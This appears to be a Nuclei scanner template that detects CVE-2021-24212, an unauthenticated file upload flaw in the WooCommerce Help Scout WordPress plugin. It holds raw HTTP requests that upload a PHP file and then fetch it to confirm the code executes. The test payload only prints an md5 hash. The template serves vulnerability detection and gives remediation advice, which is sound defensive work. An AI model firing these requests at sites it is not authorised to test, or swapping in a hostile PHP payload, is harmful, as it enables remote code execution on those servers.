http:
- matchers:
  - part: body
    type: word
    words:
    - '{{md5(num)}}'
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /wp-admin/admin-ajax.php?action=wc_help_scout_upload_attachments HTTP/1.1

    Host: {{Hostname}}

    Content-Type: multipart/form-data; boundary=------------------------NCpI6tN3BZW3fz1Y9t2bkf


    ------------------------NCpI6tN3BZW3fz1Y9t2bkf

    Content-Disposition: form-data; name="file"; filename="{{filename}}"

    Content-Type: application/x-php


    <?php echo md5(''{{num}}''); ?>

    ------------------------NCpI6tN3BZW3fz1Y9t2bkf--

    '
  - 'GET /wp-content/uploads/hstmp/{{filename}} HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2021-24212
info:
  author: ritikchaddha
  classification:
    cve-id: CVE-2021-24212
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-434
    epss-percentile: 0.98528
    epss-score: 0.68228
  description: 'WooCommerce Help Scout plugin before version 2.9.1 contains an unrestricted
    file upload vulnerability. The vulnerability allows unauthenticated users to upload
    arbitrary files to the server which by default will end up in wp-content/uploads/hstmp/
    directory, potentially leading to remote code execution.

    '
  impact: 'Unauthenticated attackers can upload malicious files, potentially leading
    to remote code execution or site compromise.

    '
  metadata:
    fofa-query: body="/wp-content/plugins/woocommerce-help-scout"
    max-request: 2
    product: help_scout
    vendor: woocommerce
    verified: false
  name: WooCommerce Help Scout - Arbitrary File Upload
  reference:
  - https://wpscan.com/vulnerability/cf9305e8-f5bc-45c3-82db-0ef00fd46129/
  - https://sploitus.com/exploit?id=WPEX-ID:CF9305E8-F5BC-45C3-82DB-0EF00FD46129
  - https://nvd.nist.gov/vuln/detail/CVE-2021-24212
  remediation: 'Update to version 2.9.1 or later.

    '
  severity: critical
  tags: cve,cve2021,wp,wordpress,wp-plugin,file-upload,rce,woocommerce-help-scout,vkev
variables:
  filename: '{{rand_base(6)}}.php'
  num: '999999999'
